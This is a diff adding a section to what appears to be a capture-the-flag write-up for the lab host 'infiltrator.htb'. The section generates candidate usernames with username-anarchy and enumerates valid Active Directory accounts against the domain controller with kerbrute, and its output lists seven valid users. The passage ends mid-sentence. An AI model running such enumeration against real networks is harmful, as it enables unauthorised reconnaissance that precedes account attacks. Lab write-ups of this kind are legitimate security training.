@@ -143,3 +143,35 @@ lauren clark
 ethan rodriguez
 ```
 
+## Valid users
+```python
+./username-anarchy -i ../potential-users.txt | tee ../AD-users.txt
+```
+
+Ill use username anarchy to generate some users
+
+```python
+kerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb AD-users.txt       
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/04/26 - Ronnie Flathers @ropnop
+
+2026/10/04 16:39:05 >  Using KDC(s):
+2026/10/04 16:39:05 >  	dc01.infiltrator.htb:88
+
+2026/10/04 16:39:05 >  [+] VALID USERNAME:	d.anderson@infiltrator.htb
+2026/10/04 16:39:05 >  [+] VALID USERNAME:	o.martinez@infiltrator.htb
+2026/10/04 16:39:05 >  [+] VALID USERNAME:	k.turner@infiltrator.htb
+2026/10/04 16:39:05 >  [+] VALID USERNAME:	a.walker@infiltrator.htb
+2026/10/04 16:39:05 >  [+] VALID USERNAME:	m.harris@infiltrator.htb
+2026/10/04 16:39:05 >  [+] VALID USERNAME:	e.rodriguez@infiltrator.htb
+2026/10/04 16:39:05 >  [+] VALID USERNAME:	l.clark@infiltrator.htb
+2026/10/04 16:39:05 >  Done! Tested 105 usernames (7 valid) in 0.168 seconds
+```
+
+These
